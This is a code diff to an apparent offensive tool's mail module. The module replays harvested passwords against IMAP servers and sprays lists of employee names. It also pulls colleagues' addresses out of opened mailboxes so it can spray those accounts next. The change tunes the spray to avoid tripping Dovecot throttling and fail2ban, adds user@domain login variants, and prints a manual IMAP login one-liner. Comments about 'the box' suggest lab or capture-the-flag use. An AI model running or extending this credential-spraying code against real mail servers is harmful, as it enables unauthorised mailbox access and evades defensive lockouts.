@@ -28,6 +28,7 @@ from ...core.report import HostReport, Finding
 from ...data import knowledge
 
 _MAX_ATTEMPTS = 350
+_GENTLE_BROAD = 25      # broad-spray cap unless --mail-spray (avoid lockouts)
 _MAX_MSGS = 25
 _TIMEOUT = 6            # per mail connection — bounds the whole pass
 _COMMON = ["admin", "administrator", "root", "info", "support", "test", "mail"]
@@ -43,6 +44,14 @@ def run(host: HostReport, opts) -> None:
     pws = list(dict.fromkeys(host.creds))
     if not (confident or broad) or not pws:
         return
+    # The broad first-name spray is loud: hundreds of failed IMAP auths per run
+    # trip Dovecot's auth-penalty / fail2ban and then lock out even the VALID
+    # login. So by default we only try the accounts the box actually named (plus
+    # colleagues surfaced from an opened mailbox); the full spray is opt-in via
+    # --mail-spray. A gentle spray keeps the valid credential working.
+    full = getattr(opts, "mail_spray", False) or os.environ.get("SCRYER_MAIL_SPRAY")
+    if not full:
+        broad = broad[:_GENTLE_BROAD]
     # Skip if we already probed this exact user/password set (the convergence
     # loop may call us again — don't re-run identical work).
     sig = (frozenset(u.lower() for u in confident + broad), frozenset(pws))
@@ -52,8 +61,10 @@ def run(host: HostReport, opts) -> None:
 
     ip = host.resolved_ip or host.target
     utils.section(f"MAIL {ip}")
+    tail = (f" then a {len(broad)}-name reuse spray" if broad else "")
+    tail += "" if full else "  (gentle — --mail-spray for the full list)"
     utils.log("info", f"replaying {len(pws)} password(s): {len(confident)} known "
-                      f"account(s) then a {len(broad)}-name reuse spray", indent=1)
+                      f"account(s){tail}", indent=1)
 
     def probe(user):
         for pw in pws:
@@ -98,6 +109,16 @@ def run(host: HostReport, opts) -> None:
                 if handle(result):
                     hits += 1
 
+    # Primary doc logins first, one at a time, so the most likely account gets a
+    # clean un-throttled attempt (both bare and user@domain forms).
+    primaries = list(dict.fromkeys(host.__dict__.get("primary_users", [])))
+    dom = _mail_domain(host)
+    prim_forms = []
+    for u in primaries:
+        prim_forms.append(u)
+        if dom and "@" not in u:
+            prim_forms.append(f"{u}@{dom}")
+    spray(prim_forms, 2)
     spray(confident, 4)
     # An opened mailbox names other employees (_harvest_correspondents adds them
     # to host.usernames) — replay the password into THOSE inboxes right away.
@@ -116,10 +137,39 @@ def run(host: HostReport, opts) -> None:
         if len(sprayed) == before:
             break
     if not hits:
-        utils.log("dim", "no mailbox opened with the known credentials", indent=1)
+        utils.log("warn", "no mailbox opened with the known credentials", indent=1)
+        # A known-good login failing usually means the mail server is throttling
+        # this IP after repeated attempts (Dovecot auth-penalty / fail2ban), not
+        # that the password is wrong. Say so and give a one-shot manual check.
+        u0 = confident[0] if confident else "kevin"
+        p0 = pws[0]
+        utils.log("dim", "if a credential you KNOW is valid didn't open, the mail "
+                         "server is likely rate-limiting/ban this IP after earlier "
+                         "sprays — wait ~15-30 min (or reset the box), then verify "
+                         "one login by hand:", indent=1)
+        utils.log("dim", f"  python3 -c 'import imaplib; m=imaplib.IMAP4_SSL(\"{ip}\""
+                         f",993); print(m.login(\"{u0}\",\"{p0}\"))'", indent=1)
 
 
 # --------------------------------------------------------------------------
+def _mail_domain(host: HostReport) -> str:
+    """The mail domain for user@domain logins — from a harvested email, else the
+    registrable parent of a known mail/vhost name."""
+    for e in host.__dict__.get("emails", set()):
+        if "@" in e:
+            return e.split("@", 1)[1].lower()
+    for hn in host.hostnames:
+        labels = hn.split(".")
+        if len(labels) >= 2 and not _looks_ip(hn):
+            return ".".join(labels[-2:]).lower()
+    return ""
+
+
+def _looks_ip(name: str) -> bool:
+    p = name.split(".")
+    return len(p) == 4 and all(x.isdigit() for x in p)
+
+
 def _candidate_users(host: HostReport):
     """Two tiers so the valid login is always tried FIRST, before a long tail of
     guesses can throttle the mail server:
@@ -130,6 +180,9 @@ def _candidate_users(host: HostReport):
                   first-name list) that finds the NEXT employee's mailbox.
     """
     confident: List[str] = []
+    # explicit doc logins ("Username: kevin") first — the single most likely
+    # account, tried before any derived variant can throttle the server.
+    confident += list(host.__dict__.get("primary_users", []))
     emails: Set[str] = host.__dict__.get("emails", set())
     for e in emails:
         confident.append(e)                       # full address
